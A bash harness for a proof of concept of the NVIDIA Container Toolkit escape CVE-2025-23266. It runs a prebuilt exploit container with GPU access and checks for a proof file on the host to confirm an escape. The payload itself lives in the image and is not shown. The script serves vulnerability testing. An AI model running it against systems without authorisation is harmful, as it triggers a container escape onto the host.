#!/bin/bash

echo "Testing NVIDIAscape CVE-2025-23266 PoC..."
echo "========================================"

# Check if NVIDIA Container Toolkit is available
if ! command -v nvidia-container-runtime &> /dev/null; then
    echo "WARNING: nvidia-container-runtime not found. This PoC requires NVIDIA Container Toolkit."
    echo "The container will still run but may not trigger the vulnerability."
    echo ""
fi

# Remove any existing proof file
sudo rm -f /tmp/nvidiascape_poc_success

echo "Running exploit container..."
echo "Container should trigger CVE-2025-23266 if NVIDIA Container Toolkit is vulnerable."
echo ""

# Run the container with GPU access to trigger the NVIDIA runtime hooks
docker run --rm --gpus all nvidiascape-poc /bin/sh -c "echo 'Container started successfully'"

echo ""
echo "Checking for container escape evidence..."

# Check if the proof file was created on the host
if [ -f "/tmp/nvidiascape_poc_success" ]; then
    echo "SUCCESS: Container escape detected!"
    echo "Proof file contents:"
    cat /tmp/nvidiascape_poc_success
    echo ""
    echo "VULNERABILITY CONFIRMED: Your system is vulnerable to CVE-2025-23266"
    
    # Clean up proof file
    sudo rm -f /tmp/nvidiascape_poc_success
else
    echo "No container escape detected."
    echo "This could mean:"
    echo "1. Your system is patched against CVE-2025-23266"
    echo "2. NVIDIA Container Toolkit is not installed/configured"
    echo "3. The container didn't have GPU access to trigger the hooks"
fi

echo ""
echo "Test complete."